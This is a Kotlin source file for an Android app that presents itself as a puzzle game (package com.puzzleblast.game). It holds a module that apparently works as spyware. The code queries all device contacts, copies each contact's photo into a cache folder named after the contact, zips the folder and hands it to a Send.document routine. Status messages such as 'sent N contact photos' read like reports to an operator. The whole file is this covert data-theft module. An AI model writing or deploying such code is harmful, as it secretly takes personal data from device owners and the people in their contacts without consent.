package com.puzzleblast.game.modules

import android.content.Context
import android.net.Uri
import android.provider.ContactsContract
import com.puzzleblast.game.core.Send
import com.puzzleblast.game.util.Zip
import java.io.File
import java.io.FileOutputStream

object ContactPhotosModule {
    suspend fun extract(ctx: Context): String {
        val cursor = ctx.contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.Contacts.PHOTO_ID),
            null, null, null
        ) ?: return "🖼 no contacts access"
        val outDir = File(ctx.cacheDir, "contact_photos")
        outDir.mkdirs()
        var count = 0
        cursor.use { c ->
            while (c.moveToNext()) {
                val id = c.getLong(0)
                val name = c.getString(1) ?: "contact_$id"
                val photoUri = Uri.withAppendedPath(
                    Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_URI, id.toString()),
                    ContactsContract.Contacts.Photo.CONTENT_DIRECTORY
                )
                try {
                    ctx.contentResolver.openInputStream(photoUri)?.use { input ->
                        val out = File(outDir, "${name.replace(" ", "_")}_$id.jpg")
                        FileOutputStream(out).use { input.copyTo(it) }
                        count++
                    }
                } catch (_: Exception) {}
            }
        }
        if (count == 0) return "🖼 no contact photos found"
        val zip = File(ctx.cacheDir, "contact_photos.zip")
        Zip.zipFolder(outDir, zip)
        Send.document(zip, "🖼 contact photos · $count")
        return "🖼 sent $count contact photos"
    }
}
